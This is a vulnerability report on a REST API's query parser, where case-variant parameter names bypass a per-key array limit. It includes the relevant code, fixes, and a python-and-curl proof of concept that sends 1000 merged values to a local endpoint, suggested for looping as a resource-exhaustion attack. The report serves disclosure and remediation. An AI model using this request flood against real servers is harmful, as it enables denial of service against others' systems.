### Title
Case-Insensitive Key Merging Bypasses `throwOnLimitExceeded` Array Limit in `requestQueryParser`

### Summary
The `requestQueryParser` function in `rest/middleware/requestHandler.js` enforces a per-key array limit via `qs`'s `throwOnLimitExceeded: true` option, but this guard operates on the raw (case-sensitive) keys produced by `qs.parse`. Because mixed-case variants of the same logical key (e.g., `transactiontype`, `transactionType`, `TRANSACTIONTYPE`) are treated as distinct keys by `qs`, each variant independently accumulates up to `maxRepeatedQueryParameters` values without triggering the limit. The subsequent merge loop then collapses all variants into a single lowercase key, producing an array that can be a multiple of `maxRepeatedQueryParameters` in size before any secondary validation runs.

### Finding Description

**Exact code path:**

`rest/middleware/requestHandler.js`, `requestQueryParser()`, lines 15–20 and 38–69.

```js
// Lines 15-20: queryOptions used for qs.parse
const queryOptions = {
  arrayLimit: config.query.maxRepeatedQueryParameters,  // default 100
  depth: 1,
  strictDepth: true,
  throwOnLimitExceeded: true,   // ← throws only when ONE key exceeds arrayLimit
};
``` [1](#0-0) 

```js
// Lines 53-68: qs.parse then merge loop
const parsedQueryString = qs.parse(queryString, queryOptions);  // sees N distinct case-variant keys

const caseInsensitiveQueryString = {};
for (const [key, value] of Object.entries(parsedQueryString)) {
  const lowerKey = key.toLowerCase();
  ...
  if (lowerKey in caseInsensitiveQueryString) {
    caseInsensitiveQueryString[lowerKey] = merge(caseInsensitiveQueryString[lowerKey], canonicalValue);
  } else {
    caseInsensitiveQueryString[lowerKey] = canonicalValue;
  }
}
``` [2](#0-1) 

**Root cause and failed assumption:**

`throwOnLimitExceeded: true` is scoped to individual `qs` keys. The code assumes that the per-key limit in `qs` is equivalent to a per-logical-key limit, but the merge step that unifies case variants happens *after* `qs.parse` returns. `qs` never sees more than one value per case variant, so it never throws. The merged result can therefore contain up to `qs.parameterLimit` (default **1000**, not overridden in `queryOptions`) values under a single lowercase key — 10× the intended `maxRepeatedQueryParameters` of 100. [3](#0-2) 

**Why secondary checks are insufficient as a primary defense:**

`validateReq` and `buildFilters` in `rest/utils.js` do check `isRepeatedQueryParameterValidLength` (line 488), but only *after* the full parse-and-merge cycle completes and the oversized array is already resident in memory. [4](#0-3) [5](#0-4) 

Additionally, `buildFilters` returns `{badParams, filters}` rather than throwing immediately, meaning callers that do not check `badParams` before further processing could act on the oversized array. [6](#0-5) 

### Impact Explanation

An unauthenticated attacker can force the server to allocate and process arrays up to 10× the intended limit (1000 entries vs. 100) on every request, bypassing the primary guard (`throwOnLimitExceeded`) that was specifically placed to prevent this. Any code path that does not subsequently call `validateReq`/`buildFilters` (or calls `buildFilters` without inspecting `badParams`) will pass the oversized array directly to SQL query construction. Even where secondary checks exist, the parse-and-merge work is performed unconditionally, making this a reliable amplification primitive for request-flooding attacks.

### Likelihood Explanation

No authentication or special privilege is required. The attack requires only the ability to send HTTP GET requests with crafted query strings. The exploit is trivially scriptable: a single request with ~200 bytes of query string (e.g., 10 case variants × 10 values each) already delivers 100 merged values, and scaling to qs's 1000-parameter ceiling requires only a ~2 KB URL — well within standard HTTP limits. The technique is repeatable at high frequency.

### Recommendation

1. **Move the array-size check into `requestQueryParser` itself**, after the merge loop, before returning `caseInsensitiveQueryString`. Throw the same error that `throwOnLimitExceeded` would throw if any merged array exceeds `maxRepeatedQueryParameters`.
2. **Set `parameterLimit` explicitly** in `queryOptions` to match `maxRepeatedQueryParameters`, preventing `qs` from accepting more total key-value pairs than the intended per-key limit:
   ```js
   const queryOptions = {
     arrayLimit: config.query.maxRepeatedQueryParameters,
     parameterLimit: config.query.maxRepeatedQueryParameters,
     depth: 1,
     strictDepth: true,
     throwOnLimitExceeded: true,
   };
   ```
3. After the merge loop, add an explicit guard:
   ```js
   for (const [lowerKey, val] of Object.entries(caseInsensitiveQueryString)) {
     if (Array.isArray(val) && val.length > config.query.maxRepeatedQueryParameters) {
       throw new Error(`Parameter ${lowerKey} exceeds max repeated query parameters`);
     }
   }
   ```

### Proof of Concept

**Precondition:** Default config (`maxRepeatedQueryParameters = 100`). No authentication needed.

**Request (curl):**
```bash
# Generate 10 case variants of "transactiontype", each repeated 100 times
python3 -c "
variants = ['transactiontype','transactionType','TransactionType',
            'TRANSACTIONTYPE','Transactiontype','tRANSACTIONTYPE',
            'TRANSACTIONtype','transactionTYPE','TransactionTYPE','TrAnSaCtIoNtYpE']
params = '&'.join(f'{v}=cryptotransfer' for v in variants for _ in range(100))
print(params)
" | xargs -I{} curl -s "http://localhost:5551/api/v1/transactions?{}"
```

**What happens:**
1. `qs.parse` sees 10 distinct keys, each with 100 values → `throwOnLimitExceeded` never fires (each key is at exactly the limit, not over it).
2. The merge loop collapses all 10 × 100 = **1000 values** into `transactiontype`.
3. `validateReq`/`buildFilters` eventually rejects with HTTP 400, but only after the 1000-element array is fully constructed in memory.
4. Sending this request in a tight loop from multiple clients constitutes a practical resource-exhaustion attack against the parsing layer.

**Verification (unit test):**
```js
// Demonstrates bypass — produces array of 3, not a throw, even though
// the logical key "transactiontype" has 3 values across 2 case variants
const val = requestQueryParser('transactiontype=bar&transactionType=xyz&transactionType=ppp');
// val === { transactiontype: ['bar', 'xyz', 'ppp'] }  ← no error thrown
``` [7](#0-6)

### Citations

**File:** rest/middleware/requestHandler.js (L15-20)
```javascript
const queryOptions = {
  arrayLimit: config.query.maxRepeatedQueryParameters,
  depth: 1,
  strictDepth: true,
  throwOnLimitExceeded: true,
};
```

**File:** rest/middleware/requestHandler.js (L53-68)
```javascript
  // parse first to benefit from qs query handling
  const parsedQueryString = qs.parse(queryString, queryOptions);

  const caseInsensitiveQueryString = {};
  for (const [key, value] of Object.entries(parsedQueryString)) {
    const lowerKey = key.toLowerCase();
    const canonicalValue = canonicalizeValue(lowerKey, value);
    if (lowerKey in caseInsensitiveQueryString) {
      // handle repeated values, merge into an array
      caseInsensitiveQueryString[lowerKey] = merge(caseInsensitiveQueryString[lowerKey], canonicalValue);
    } else {
      caseInsensitiveQueryString[lowerKey] = canonicalValue;
    }
  }

  return caseInsensitiveQueryString;
```

**File:** rest/utils.js (L463-471)
```javascript
    if (Array.isArray(req.query[key])) {
      if (!isRepeatedQueryParameterValidLength(req.query[key])) {
        badParams.push({
          code: InvalidArgumentError.PARAM_COUNT_EXCEEDS_MAX_CODE,
          key,
          count: req.query[key].length,
          max: config.query.maxRepeatedQueryParameters,
        });
        continue;
```

**File:** rest/utils.js (L488-488)
```javascript
const isRepeatedQueryParameterValidLength = (values) => values.length <= config.query.maxRepeatedQueryParameters;
```

**File:** rest/utils.js (L1241-1249)
```javascript
      if (!isRepeatedQueryParameterValidLength(values)) {
        badParams.push({
          code: InvalidArgumentError.PARAM_COUNT_EXCEEDS_MAX_CODE,
          key,
          count: values.length,
          max: config.query.maxRepeatedQueryParameters,
        });
        continue;
      }
```

**File:** rest/__tests__/requestHandler.test.js (L26-29)
```javascript
  test('requestQueryParser for repeated query params of different cases with matching repetitions', () => {
    const val = requestQueryParser('transactiontype=bar&transactionType=xyz&transactionType=ppp');
    expect(val).toStrictEqual({transactiontype: ['bar', 'xyz', 'ppp']});
  });
```
